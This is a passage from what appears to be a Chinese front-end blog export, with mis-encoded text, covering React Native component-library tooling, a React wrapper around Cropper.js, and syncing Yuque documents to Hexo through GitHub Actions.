äº†ï¼Œç®€å•è€Œä¸ç®€é™‹ï¼Œå®Œå…¨èƒ½å¤Ÿèƒœä»»ç»„ä»¶åº“ç¼–æ’çš„å·¥ä½œï¼Œå› æ­¤é¦–é€‰ Lerna äº†ã€‚ï¼ˆæ€§èƒ½ç¡®å®ä¸å¦‚å…¶ä»–çš„å·¥å…·ï¼Œæ¯”å¦‚ Turborepoï¼Œä½†æ˜¯ç›®å‰ä¹Ÿå¹¶æ²¡æœ‰å¤ªå¤§çš„æ€§èƒ½è¯‰æ±‚ï¼Œä»¥åé‡åˆ°äº†ï¼Œå¯ä»¥åœ¨è¿ç§»ï¼‰ ç»„ä»¶åº“æ„å»ºå·¥å…·æˆ‘ä»¬çš„ç»„ä»¶åº“æœ€ç»ˆæ˜¯éœ€è¦å‘å¸ƒåˆ° npm ä¸Šçš„ï¼Œå› ä¸ºç»„ä»¶åº“çš„è¿è¡Œç¯å¢ƒä¸åœ¨æµè§ˆå™¨ä¸­ï¼Œå› æ­¤åªéœ€è¦æä¾› ES Moduleå’Œ CommonJSæ¨¡å—çš„ç»„ä»¶å³å¯ï¼Œå¦å¤–å¦‚æœæ˜¯ Typescript å·¥ç¨‹ï¼Œæ„å»ºæ—¶è¿˜éœ€è¦è¾“å‡ºç±»å‹æ–‡ä»¶ï¼Œåœ¨è°ƒç ”ç¤¾åŒºå¼€æºçš„ç»„ä»¶åº“ä¼šé”å®šä¸€ä¸ªå·¥å…· - react-native-builder-bob å®‰è£… react-native-builder-bob: 1yarn add react-native-builder-bob -D é…ç½®åŠä½¿ç”¨éƒ½å¾ˆç®€å•ï¼Œåœ¨ package.json ä¸­æ–°å¢å¦‚ä¸‹é…ç½®ï¼š 12345678910111213141516171819&#123; &quot;scripts&quot;: &#123; &quot;build&quot;: &quot;bob build&quot; &#125;, &quot;react-native-builder-bob&quot;: &#123; &quot;source&quot;: &quot;src&quot;, &quot;output&quot;: &quot;lib&quot;, &quot;targets&quot;: [ &quot;commonjs&quot;, &quot;module&quot;, [ &quot;typescript&quot;, &#123; &quot;project&quot;: &quot;tsconfig.build.json&quot; &#125; ] ] &#125;&#125; è¿è¡Œ yarn buildåï¼Œä¼šåœ¨ lib ç›®å½•ä¸‹ç”Ÿæˆç›¸åº”æ¨¡å—çš„æ–‡ä»¶ï¼š æœ€ååœ¨ package.json ä¸­ï¼Œæ·»åŠ è¿™äº›æ¨¡å—çš„å…¥å£è¯´æ˜ï¼š 1234567&#123; &quot;main&quot;: &quot;lib/commonjs/index&quot;, &quot;module&quot;: &quot;lib/module/index&quot;, &quot;types&quot;: &quot;lib/typescript/index.d.ts&quot;, &quot;react-native&quot;: &quot;src/index&quot;, &quot;source&quot;: &quot;src/index&quot;&#125; ä»£ç è´¨é‡ and ä»£ç é£æ ¼ä»£ç è´¨é‡ç›®å‰åªé…ç½®äº† eslintï¼Œåé¢å¦‚æœæœ‰æ›´å¥½çš„å·¥å…·ï¼Œå¯ä»¥å°è¯•æ¥å…¥ã€‚ç°åœ¨ä½¿ç”¨çš„æ˜¯ https://github.com/youngjuning-archive/eslint-config è¿™ä¸ªï¼Œä¸»è¦çœ‹ä¸­å®ƒå°† prettier å’Œ eslint é›†æˆåˆ°ä¸€èµ·äº†ï¼Œçœäº†è‡ªå·±é…ç½®ï¼ˆprettier å’Œ eslint æœ‰äº›è§„åˆ™æ˜¯å†²çªçš„ï¼Œè§£å†³èµ·æ¥è¶…çº§éº»çƒ¦ï¼‰ï¼Œè€Œä¸” eslint çš„è§„åˆ™æ¥è‡ª airbnbï¼Œä»£ç è´¨é‡ä¹Ÿæœ‰äº†ä¿éšœã€‚ ä»£ç é£æ ¼ç”¨çš„æ˜¯ prettierï¼Œå› ä¸ºå·²ç»é›†æˆåˆ° @youngjuning/eslint-configäº†ï¼Œåªéœ€è¦å®‰è£… @youngjuning/prettier-configï¼Œå¹¶ç®€å•é…ç½®ä¸‹å°±èƒ½ä½¿ç”¨äº†ã€‚ 12// .prettierrc.jsmodule.exports = require(&quot;@youngjuning/prettier-config&quot;); é™¤äº† eslint å’Œ prettierï¼Œæˆ‘ä»¬è¿˜èƒ½å€ŸåŠ©ä¸€äº›å·¥å…·ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„ç»„ç»‡ä»£ç ï¼š huskyï¼šç®¡ç† git hook çš„å·¥å…·ï¼Œå¯ä»¥åœ¨ git commit æ—¶ï¼Œå¼ºåˆ¶æ ¡éªŒå’Œæ ¼å¼åŒ–ä»£ç ã€‚ lint-stagedï¼šé’ˆå¯¹ git æš‚å­˜æ–‡ä»¶æ‰§è¡Œä¸€äº›è„šæœ¬ï¼Œç»“åˆ husky å¯ä»¥å®ç°åªå¯¹æ”¹åŠ¨çš„æ–‡ä»¶ï¼Œæ ¡éªŒå’Œæ ¼å¼åŒ–ï¼Œæ¯•ç«Ÿæ”¹ä¸€è¡Œä»£ç å°±è¦æ ¡éªŒæ•´ä¸ªä»“åº“æˆæœ¬è¿˜æ˜¯å¤ªé«˜äº†ã€‚ commitlintï¼šgit commit messages é£æ ¼æ ¡éªŒå·¥å…·ã€‚ è‡³äºå¦‚ä½•åœ¨ lerna é¡¹ç›®ä¸­å¦‚ä½•é›†æˆè¿™äº›å·¥å…·ï¼Œå¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ ã€lerna é¡¹ç›®ä¸­é›†æˆ huskyã€lint-stagedã€commitlint å’Œ cz-customizableã€‘ï¼Œé‡Œé¢åšäº†è¯¦ç»†çš„è¯´æ˜ã€‚ æ€»ç»“æœ¬æ–‡ä¸»è¦ä»‹ç»äº†å¼€å‘ä¸€ä¸ªç»„ä»¶åº“éœ€è¦çš„ä¸€äº›å·¥å…·çš„é€‰å‹ï¼Œå®é™…ä¸Šè¿™äº›å·¥å…·ç†Ÿæ‚‰å‰ç«¯å·¥ç¨‹åŒ–çš„åŒå­¦éƒ½ä¸ä¼šé™Œç”Ÿï¼Œå…·ä½“çš„é…ç½®å¯ä»¥å‚è€ƒæˆ‘çš„ç»„ä»¶åº“é¡¹ç›® - rn-vantã€‚åé¢æˆ‘ä¼šå†ä»‹ç»ä¸‹ç»„ä»¶æ–¹çš„æ–‡æ¡£åŠ CI&#x2F;CD çš„ç›¸å…³é…ç½®ã€‚","tags":["React","React Native"],"categories":["React Native","ç»„ä»¶åº“"]},{"title":"Cropper.js å®è·µ","path":"/2023/02/02/1b69b3598f64/","content":"èƒŒæ™¯å‰æ®µæ—¶é—´æ¥äº†ä¸ªéœ€æ±‚ï¼Œéœ€è¦åšä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œé¢„è§ˆåŠè£åˆ‡æœåŠ¡ï¼Œè°ƒç ”äº†ä¸‹ç¤¾åŒºçš„å¼€æºæ–¹æ¡ˆï¼Œcropperjs è¿›å…¥è§†é‡ï¼Œç®€å•çœ‹äº†ä¸‹ READMEï¼Œå®Œç¾ç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œæœ€ç»ˆå®ç°æ•ˆæœå¦‚ä¸‹ï¼š å®‰è£…æ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥ yarn èµ°èµ·ï¼š 1yarn add cropperjs å¼•å…¥ CSS æ–‡ä»¶ï¼š 1import &quot;cropperjs/dist/cropper.css&quot;; å°è£…ç®€å•çš„åˆ†æä¸‹éœ€æ±‚ï¼Œæ•´ä¸ªå›¾ç‰‡è£åˆ‡åŒ…å«ä»¥ä¸‹å‡ ä¸ªéƒ¨ä»¶ï¼š å›¾ç‰‡è£åˆ‡æ¡† - åŒ…å«ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ï¼Œéœ€è¦åˆ†å¼€è£åˆ‡ æ›¿æ¢å›¾ç‰‡æŒ‰é’® - æ›¿æ¢å›¾ç‰‡åï¼Œã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€éƒ½éœ€è¦æ›¿æ¢ å›¾ç‰‡é¢„è§ˆ - åŒæ ·ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ä¹Ÿéœ€è¦åˆ†å¼€é¢„è§ˆ Cropper.js æ˜¯ä¸ªåŸç”Ÿçš„è£åˆ‡åº“ï¼Œåœ¨æˆ‘ä»¬çš„ React é¡¹ç›®ä¸­æŒ‰ç…§ä¸Šé¢çš„åŠŸèƒ½åˆ’åˆ†å°è£…æˆä»¥ä¸‹å‡ ä¸ªç»„ä»¶ï¼š Upload.tsx 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useContext, memo &#125; from &quot;react&quot;;import &#123; Upload as PDUpload &#125; from &quot;@universe-design/react&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;type UploadProps = &#123; maxSize?: number; children?: React.ReactNode; accept?: string;&#125;;export const Upload = memo((props: UploadProps): JSX.Element =&gt; &#123; const &#123; accept = &quot;image/*&quot;, maxSize &#125; = props; const &#123; setSrc &#125; = useContext(CropperContext); const beforeUpload = (file: File) =&gt; &#123; // æ£€æŸ¥æ–‡ä»¶å¤§å° if (file.size &amp;&amp; maxSize &amp;&amp; file.size &gt; maxSize) &#123; return PDUpload.LIST_IGNORE; &#125; const reader = new FileReader(); reader.onload = () =&gt; &#123; setSrc?.(reader.result as string); &#125;; reader.readAsDataURL(file); return false; &#125;; return ( &lt;PDUpload maxCount=&#123;1&#125; beforeUpload=&#123;beforeUpload&#125; fileList=&#123;[]&#125; accept=&#123;accept&#125; &gt; &#123;props.children&#125; &lt;/PDUpload&gt; );&#125;); è¿™ä¸ªç»„ä»¶çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯ä½¿ç”¨ç»„ä»¶åº“çš„ä¸Šä¼ ç»„ä»¶è·å–æ–‡ä»¶çš„ base64ï¼Œç„¶åä¿å­˜åˆ° context é‡Œï¼Œæ–¹ä¾¿è£åˆ‡ç»„ä»¶æ¶ˆè´¹ã€‚ Context.tsx 12345678910111213141516171819202122232425262728293031323334import React, &#123; createContext, FC, useMemo, useState, useRef &#125; from &quot;react&quot;;import &#123; uniqueId &#125; from &quot;lodash&quot;;export interface CropperState &#123; src?: string | undefined; setSrc: (src: string) =&gt; void; previewClass: string;&#125;export interface CropperProviderProps &#123; src?: string | undefined;&#125;export const CropperContext = createContext&lt;CropperState&gt;(&#123;&#125; as CropperState);export const CropperProvider: FC&lt;CropperProviderProps&gt; = (props) =&gt; &#123; const [src, setSrc] = useState(props.src); const previewClass = useRef(uniqueId(&quot;image_preview_&quot;)); const contextState = useMemo&lt;CropperState&gt;( () =&gt; (&#123; src, setSrc, previewClass: previewClass.current, &#125;), [src] ); return ( &lt;CropperContext.Provider value=&#123;contextState&#125;&gt; &#123;props.children&#125; &lt;/CropperContext.Provider&gt; );&#125;; Prview.tsx 1234567891011121314151617181920212223242526import React, &#123; useContext, memo &#125; from &quot;react&quot;;import classnames from &quot;classnames&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;export interface PreviewProps extends React.HTMLAttributes&lt;HTMLDivElement&gt; &#123; name?: string;&#125;export const Preview: React.FC&lt;PreviewProps&gt; = memo((props) =&gt; &#123; const &#123; name = &quot;default&quot;, className, children, ...rest &#125; = props; const &#123; previewClass &#125; = useContext(CropperContext); return ( &lt;div &#123;...rest&#125; className=&#123;classnames( `$&#123;previewClass&#125;-$&#123;name&#125;`, styles[&quot;image-preview&quot;], className )&#125; &gt; &#123;children&#125; &lt;/div&gt; );&#125;); é¢„è§ˆç»„ä»¶æœ¬èº«ä¹Ÿä¸å¤æ‚ï¼Œå°±æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCropper.js çš„ preview å‚æ•°å¯ä»¥æ˜¯ä¸ªå…ƒç´ ï¼Œå…ƒç´ æ•°ç»„æˆ–è€…èƒ½å¤Ÿè¢« Document.querySelectorAll é€‰ä¸­çš„ class é€‰æ‹©å™¨ï¼Œå› ä¸ºå°è£…æˆäº†é€šç”¨ç»„ä»¶ï¼Œå› æ­¤ä½¿ç”¨äº† lodash çš„ uniqueId æ–¹æ³•ç”Ÿæˆå”¯ä¸€çš„ classï¼Œé˜²æ­¢é¡µé¢å‡ºç°å¤šä¸ª Prview ç»„ä»¶æ—¶ï¼Œclass ç±»åå†²çªã€‚ Cropper.tsx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import React, &#123; useContext, memo, useRef, useEffect &#125; from &quot;react&quot;;import Cropper from &quot;cropperjs&quot;;import &#123; useMemoizedFn, useInViewport, useUpdateLayoutEffect &#125; from &quot;ahooks&quot;;import classnames from &quot;classnames&quot;;import &quot;cropperjs/dist/cropper.css&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;type CropperOptions = Cropper.Options&lt;HTMLImageElement&gt;;type ReactCropperProps = Pick&lt;CropperOptions, &quot;aspectRatio&quot;&gt; &amp; &#123; name?: string; style?: React.CSSProperties; className?: string; alt?: string; src?: string; data?: Cropper.Data; onCrop?: (data: Cropper.Data) =&gt; void; // ç›‘å¬è£åˆ‡æ¡†çš„å˜åŠ¨&#125;;interface ReactCropperElement extends HTMLImageElement &#123; cropper: Cropper;&#125;export type ReactCropperRef = Cropper;const REQUIRED_IMAGE_STYLES = &#123; opacity: 0, maxWidth: &quot;100%&quot; &#125;;const ReactCropper = React.forwardRef&lt;ReactCropperRef, ReactCropperProps&gt;( (props, ref) =&gt; &#123; const &#123; name = &quot;default&quot;, style, className, alt = &quot;picture&quot;, aspectRatio, data, onCrop, &#125; = props; const boxRef = useRef&lt;HTMLDivElement&gt;(null); const combinedRef = useRef&lt;ReactCropperElement&gt;(null); const cropperState = useContext(CropperContext); // æ˜¯å¦åœ¨å¯æ˜¯åŒºåŸŸå†… const [inViewport] = useInViewport(boxRef); const src = cropperState?.src || props?.src; const preSrc = useRef&lt;string | undefined&gt;(src); const preview = `.$&#123;cropperState.previewClass&#125;-$&#123;name&#125;`; React.useImperativeHandle(ref, () =&gt; combinedRef.current!.cropper); /** * æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰èƒ½é‡æ–° render * 1. src åœ°å€å˜æ›´ * 2. åœ¨å¯æ˜¯åŒºåŸŸå†…ï¼ˆå¦‚æœä¸åœ¨å¯è§†åŒºåŸŸï¼Œrender æ—¶ä¼šå‡ºé—®é¢˜ï¼‰ */ useEffect(() =&gt; &#123; if ( combinedRef.current?.cropper &amp;&amp; typeof src !== &quot;undefined&quot; &amp;&amp; inViewport &amp;&amp; src !== preSrc.current ) &#123; combinedRef.current.cropper.reset().clear().replace(src); preSrc.current = src; &#125; &#125;, [inViewport, src]); const handleCrop = useMemoizedFn(() =&gt; &#123; if (combinedRef.current?.cropper) &#123; onCrop?.(combinedRef.current?.cropper.getData()); &#125; &#125;); useUpdateLayoutEffect(() =&gt; &#123; data &amp;&amp; combinedRef.current?.cropper.setData(data); &#125;, [data]); useUpdateLayoutEffect(() =&gt; &#123; aspectRatio &amp;&amp; combinedRef.current?.cropper.setAspectRatio(aspectRatio); &#125;, [aspectRatio]); useEffect(() =&gt; &#123; if (combinedRef.current !== null) &#123; // eslint-disable-next-line no-new new Cropper(combinedRef.current, &#123; viewMode: 1, // é™åˆ¶è£å‰ªæ¡†ä¸èƒ½è¶…å‡ºå›¾ç‰‡çš„èŒƒå›´ dragMode: &quot;crop&quot;, // æ‹–æ‹½å›¾ç‰‡æ—¶å½¢æˆæ–°çš„è£å‰ªæ¡† guides: true, // æ˜¯å¦æ˜¾ç¤ºè£å‰ªæ¡†çš„è™šçº¿ scalable: false, // æ˜¯å¦å¯ä»¥ç¼©æ”¾å›¾ç‰‡ï¼ˆå¯ä»¥æ”¹å˜é•¿å®½ï¼‰ zoomable: false, // æ˜¯å¦å¯ä»¥ç¼©æ”¾å›¾ç‰‡ï¼ˆæ”¹å˜ç„¦è·ï¼‰ zoomOnTouch: false, // æ˜¯å¦å¯ä»¥é€šè¿‡æ‹–æ‹½è§¦æ‘¸ç¼©æ”¾å›¾ç‰‡ zoomOnWheel: false, // æ˜¯å¦å¯ä»¥é€šè¿‡é¼ æ ‡æ»šè½®ç¼©æ”¾å›¾ç‰‡ center: false, // æ˜¯å¦æ˜¾ç¤ºè£å‰ªæ¡†ä¸­é—´çš„ â€˜+â€™ æŒ‡ç¤ºå™¨ responsive: false, // æ˜¯å¦åœ¨çª—å£å°ºå¯¸è°ƒæ•´å è¿›è¡Œå“åº”å¼çš„é‡æ¸²æŸ“ movable: false, // æ˜¯å¦å¯ä»¥ç§»åŠ¨å›¾ç‰‡ preview, aspectRatio, // è®¾ç½®è£å‰ªæ¡†ä¸ºå›ºå®šçš„å®½é«˜æ¯” data, // ä¹‹å‰å­˜å‚¨çš„è£å‰ªåçš„æ•°æ® åœ¨åˆå§‹åŒ–æ—¶ä¼šè‡ªåŠ¨è®¾ç½® crop: handleCrop, &#125;); &#125; return () =&gt; &#123; combinedRef.current?.cropper?.destroy(); &#125;; // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, [preview, handleCrop]); return ( &lt;div style=&#123;style&#125; className=&#123;classnames(styles.cropper, className)&#125; ref=&#123;boxRef&#125; &gt; &lt;img src=&#123;src&#125; alt=&#123;alt&#125; style=&#123;REQUIRED_IMAGE_STYLES&#125; ref=&#123;combinedRef&#125; /&gt; &lt;/div&gt; ); &#125;);export default memo(ReactCropper); æœ€åå°±æ˜¯é‡å¤´æˆçš„ Cropper äº†ï¼Œç»„ä»¶å†…éƒ¨å°è£…äº† Cropper.js åˆå§‹åŒ–é€»è¾‘ï¼Œå›¾ç‰‡åˆ‡æ¢çš„é€»è¾‘ã€‚ index.tsx 123456789101112131415import CropperInner from &quot;./Cropper&quot;;import &#123; CropperProvider &#125; from &quot;./Context&quot;;import &#123; Upload &#125; from &quot;./Upload&quot;;import &#123; Preview &#125; from &quot;./Preview&quot;;export * from &quot;./Cropper&quot;;export * from &quot;./Context&quot;;const Cropper = Object.assign(CropperInner, &#123; Upload, Provider: CropperProvider, Preview,&#125;);export default Cropper; æœ€åå°±æ˜¯å°†è¿™äº›ç»„ä»¶å…¨éƒ¨æŒ‚è½½åˆ° Cropperï¼Œå¯¹å¤–åªæš´éœ² Cropper è¿™ä¸€ä¸ªç»„ä»¶ã€‚ ä½¿ç”¨ä½¿ç”¨å°è£…åçš„ Cropper ç»„ä»¶å¤§æ¦‚å¦‚ä¸‹ï¼Œå…¶ä¸­ Cropper ç»„ä»¶å’Œ Cropper.Preview ç»„ä»¶å¯ä»¥æœ‰ä»»æ„å¤šä¸ªï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œä¸¤ä¸ªç»„ä»¶çš„ name å­—æ®µè¦ä¸€ä¸€å¯¹åº”ï¼Œå¦åˆ™ä¼šå‡ºç°æ— æ³•å®æ—¶é¢„è§ˆçš„æƒ…å†µã€‚ 123456789101112131415161718192021222324252627import Cropper from &quot;./Cropper&quot;;export default () =&gt; &#123; return ( &lt;Cropper.Provider src=&quot;xxxxx&quot;&gt; // è£åˆ‡ç»„ä»¶ &lt;Cropper aspectRatio=&#123;PC_CROP_RATIO&#125; name=&quot;PC&quot; ref=&#123;(ref) =&gt; setRef(ref!, TYPE.web)&#125; className=&#123;styles[&quot;container-cropper&quot;]&#125; onCrop=&#123;(data) =&gt; handleCrop(data, TYPE.web)&#125; data=&#123;cacheValue.current?.tailored_info?.web&#125; /&gt; // ä¸Šä¼ ç»„ä»¶ &lt;Cropper.Upload accept=&#123;UPLOAD_ACCEPT&#125; maxSize=&#123;UPLOAD_MAX_SIZE&#125;&gt; &lt;Button type=&quot;link&quot;&gt;&#123;i18next.t(&quot;replace-image&quot;)&#125;&lt;/Button&gt; &lt;/Cropper.Upload&gt; // é¢„è§ˆç»„ä»¶ &lt;Cropper.Preview style=&#123;bannerStyle&#125; className=&#123;styles[&quot;preview-mobile&quot;]&#125; name=&quot;mobile&quot; /&gt; &lt;/Cropper.Provider&gt; );&#125;; æ ·å¼è¦†ç›–ç»„ä»¶é€»è¾‘è§£å†³äº†ï¼Œç°åœ¨è§£å†³æ ·å¼é—®é¢˜ã€‚æˆ‘ä»¬ä¹‹å‰å¼•å…¥äº† cropperjs çš„é»˜è®¤æ ·å¼æ–‡ä»¶ï¼Œç°åœ¨åªéœ€è¦è¦†ç›–æ‰å®ƒçš„æ ·å¼å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// å¤å†™ Cropper çš„æ ·å¼.cropper &#123; :global &#123; .cropper-modal &#123; opacity: 0.4; &#125; .cropper-line &#123; background-color: #fff; &#125; .cropper-point &#123; &amp;.point-e, &amp;.point-n, &amp;.point-w, &amp;.point-s &#123; display: none; &#125; &amp;.point-ne, &amp;.point-nw, &amp;.point-sw, &amp;.point-se &#123; width: 20px; height: 20px; background: transparent; opacity: 1; &#125; &amp;.point-nw, &amp;.point-ne &#123; border-top: 3px solid #fff; &#125; &amp;.point-nw, &amp;.point-sw &#123; border-left: 3px solid #fff; &#125; &amp;.point-ne, &amp;.point-se &#123; border-right: 3px solid #fff; &#125; &amp;.point-sw, &amp;.point-se &#123; border-bottom: 3px solid #fff; &#125; &#125; .cropper-view-box &#123; outline-color: #fff; &#125; .cropper-dashed &#123; border-style: solid; opacity: 1; &#125; &#125;&#125; é—®é¢˜ è·å–è£åˆ‡åå›¾ç‰‡ blob å›¾ç‰‡è£åˆ‡ï¼Œéœ€è¦è·å–è£åˆ‡å›¾ç‰‡çš„ blob ä¸Šä¼ åˆ° CDNï¼ŒCropperjs æä¾›äº†è·å– blob çš„æ–¹æ³•ï¼š 1cropper.getCroppedCanvas().toBlob((blob) =&gt; &#123;&#125;) ä½†æ˜¯åœ¨æˆ‘ä»¬ä¸šåŠ¡çš„åœºæ™¯ä¸‹ï¼ŒåŒæ—¶ä¼šå­˜åœ¨ä¸¤ä¸ªè£åˆ‡æ¡†åˆ†åˆ«ç”¨æ¥è£åˆ‡ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ï¼Œç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå›¾ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´æ›¿æ¢å›¾ç‰‡ä¼šåŒæ—¶æ›¿æ¢ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€çš„å›¾ç‰‡ã€‚è¿™å°±å¯¼è‡´äº†æ›¿æ¢å›¾ç‰‡åï¼Œåªæœ‰å½“å‰æ¿€æ´»çš„ tab ä¸‹çš„ cropper è°ƒç”¨ getCroppedCanvas æ‰èƒ½è·å–åˆ°æ›¿æ¢å›¾ç‰‡åçš„æ•°æ®ï¼Œæ²¡æœ‰æ¿€æ´»çš„ tab ä¸‹è¿˜æ˜¯è·å–æ—§å›¾ç‰‡çš„æ•°æ®ã€‚ å¤ç°è·¯å¾„ï¼šé™¤éåœ¨æäº¤å‰ï¼Œæ‰‹åŠ¨åˆ‡æ¢åˆ°ç§»åŠ¨ç«¯çš„ tabï¼Œä¸ç„¶è¯¥é—®é¢˜ä¼šä¸€ç›´å­˜åœ¨ï¼Œè¿™æ˜¯ cropperjs å†…éƒ¨å®ç°çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä¸èƒ½è¦æ±‚ç”¨æˆ·å¤šè¿™ä¹ˆä¸€ä¸ªæ— æ„ä¹‰çš„æ­¥éª¤ï¼Œå› æ­¤æˆ‘ä»¬è‡ªå·±å®ç° ã€ŒgetCroppedCanvasã€æ–¹æ³•ï¼Œä¸ç”¨ cropperjs æš´éœ²çš„æ–¹æ³• 1234567891011121314151617181920212223242526272829// ä½¿ç”¨ canvas è£åˆ‡å›¾ç‰‡export const cropImage = (source: string, options: Options) =&gt; &#123; const &#123; width, height, x, y &#125; = options; const canvas = document.createElement(&quot;canvas&quot;); const context = canvas.getContext(&quot;2d&quot;)!; const image = new Image(); image.src = source; image.crossOrigin = &quot;anonymous&quot;; return new Promise&lt;HTMLCanvasElement&gt;((resolve) =&gt; &#123; image.onload = () =&gt; &#123; const [px, py, pw, ph] = [ inRange(x, 0, image.width) ? x : 0, inRange(y, 0, image.height) ? y : 0, inRange(width, 0, image.width) ? width : image.width, inRange(height, 0, image.height) ? height : image.height, ].map((param) =&gt; Math.floor(normalizeDecimalNumber(param))); canvas.width = pw; canvas.height = ph; context.imageSmoothingEnabled = true; context.imageSmoothingQuality = &quot;low&quot;; context.drawImage(image, px, py, pw, ph, 0, 0, pw, ph); context.restore(); resolve(canvas); &#125;; &#125;);&#125;;"},{"title":"è¯­é›€åŒæ­¥åˆ° Github Hexo","path":"/2023/01/31/5e91c1995fd8/","content":"èƒŒæ™¯æˆ‘çš„åšå®¢éƒ½æ˜¯ç”¨ Hexo åœ¨æœ¬åœ°å†™å®Œï¼Œæäº¤ä¸ª commit åˆ° Githubï¼Œè§¦å‘ Github Action è‡ªåŠ¨éƒ¨ç½²åˆ° Github Page ä¸Šã€‚é™¤äº†ç”¨ Vscode å†™ Markdown æœ‰ç‚¹éš¾å—å¤–ï¼Œå…¶å®ƒåœ°æ–¹è¿˜å¥½ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸€å®šè¦ç”¨ Hexo + Github çš„ç»„åˆï¼Œç™½å«– Github çš„æœåŠ¡å™¨å®ƒä¸é¦™å—ï¼Ÿ ä½†æ˜¯ï¼Œæœ€è¿‘ä½“éªŒäº†ä¸‹è¯­é›€ï¼Œå‘ç°ä»–çš„æ–‡æœ¬ç¼–è¾‘å™¨è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œå†™æ–‡æ¡£å¾ˆæ˜¯ä¸æ»‘ï¼Œæ­£å¥½åœ¨ Github ä¸Šå‘ç°äº†ä¸ªé¡¹ç›® - https://github.com/x-cold/yuque-hexoï¼Œå¯ä»¥å°†è¯­é›€çš„æ–‡ç« åŒæ­¥åˆ° Hexo ä¸­ï¼Œæ˜¯æ—¶å€™æ”¹å˜ä¸‹åšå®¢å†™ä½œæµç¨‹äº†ã€‚ä¸‹é¢å°±è®°å½•äº†æ•´ä¸ªè¿ç§»è¿‡ç¨‹ã€‚ å®‰è£…åŠé…ç½® yuque-hexoåœ¨ hexo é¡¹ç›®çš„æ ¹ç›®å½•ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£… yuque-hexoï¼š 1yarn add yuque-hexo -D 1. æ–°å¢é…ç½®ï¼š123456789101112131415161718192021&#123; &quot;yuqueConfig&quot;: &#123; &quot;postPath&quot;: &quot;source/_posts/yuque&quot;, &quot;cachePath&quot;: &quot;yuque.json&quot;, &quot;mdNameFormat&quot;: &quot;title&quot;, &quot;adapter&quot;: &quot;hexo&quot;, &quot;concurrency&quot;: 5, &quot;baseUrl&quot;: &quot;https://www.yuque.com/api/v2&quot;, &quot;login&quot;: &quot;bijinfeng-fyjgs&quot;, &quot;repo&quot;: &quot;blog&quot;, &quot;onlyPublished&quot;: true, &quot;onlyPublic&quot;: false, &quot;imgCdn&quot;: &#123; &quot;concurrency&quot;: 0, &quot;imageBed&quot;: &quot;upyun&quot;, &quot;enabled&quot;: true, &quot;bucket&quot;: &quot;xxxx&quot;, &quot;prefixKey&quot;: &quot;yuque&quot; &#125; &#125;&#125; yuqueConfig ä¸­æ¯ä¸ªå­—æ®µçš„ä½œç”¨åœ¨ yuque-hexo çš„ README ä¸­éƒ½æœ‰è¯´æ˜ï¼Œæˆ‘è¿™é‡ŒæŒ‘å‡ ä¸ªé‡ç‚¹çš„è¯´ä¸‹ï¼š login - ä¸ªäººè·¯å¾„ repo - çŸ¥è¯†åº“è·¯å¾„ 2. æ–°å¢è„šæœ¬è¿™äº›è„šæœ¬ä¸»è¦ç”¨åœ¨åé¢çš„ Github Action ä¸­ï¼Œå½“ç„¶ä¹Ÿæ–¹ä¾¿æœ¬åœ°è°ƒè¯•ä½¿ç”¨ 1234567&#123; &quot;scripts&quot;: &#123; &quot;clean:yuque&quot;: &quot;yuque-hexo clean&quot;, &quot;sync&quot;: &quot;yuque-hexo sync&quot;, &quot;reset&quot;: &quot;npm run clean:yuque &amp;&amp; npm run sync&quot; &#125;&#125; é…ç½® Github Actionåœ¨ä¿®æ”¹ Github Action é…ç½®æ–‡ä»¶å‰ï¼Œæˆ‘ä»¬å…ˆéœ€è¦è·å–å‡ ä¸ª Tokenï¼š YUQUE_TOKEN æ–°å¢æˆ–ä½¿ç”¨ç°æœ‰çš„ Tokenï¼ŒToken ç»™ä¸ªè¯»å–æƒé™å°±è¡Œäº† SECRET_ID &#x2F; SECRET_KEY å›¾åºŠç›¸å…³çš„å¯†é’¥ï¼Œæˆ‘ç”¨çš„æ˜¯åˆæ‹äº‘ï¼Œéœ€è¦æ“ä½œå‘˜çš„è´¦å·å’Œå¯†ç ï¼ˆå¯†ç å¿˜äº†çš„è¯ï¼Œç‚¹å‡»ç¼–è¾‘æŒ‰é’®ï¼Œé‡æ–°ç”Ÿæˆä¸ªï¼‰ åœ¨ Github é¡¹ç›®çš„ Setting ä¸­æ–°å¢ä¸‰ä¸ªç¯å¢ƒå˜é‡ ä¸Šé¢çš„å˜é‡éƒ½å‡†å¤‡å¥½åï¼Œæ¥åˆ° hexo é¡¹ç›®çš„ .github&#x2F;workflows ç›®å½•ï¼Œæ–°å¢ä¸ª deploy.yml æ–‡ä»¶: 123456789101112131415161718192021222324252627282930313233343536name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: environment: github-pages env: yuque_token: $&#123;&#123; 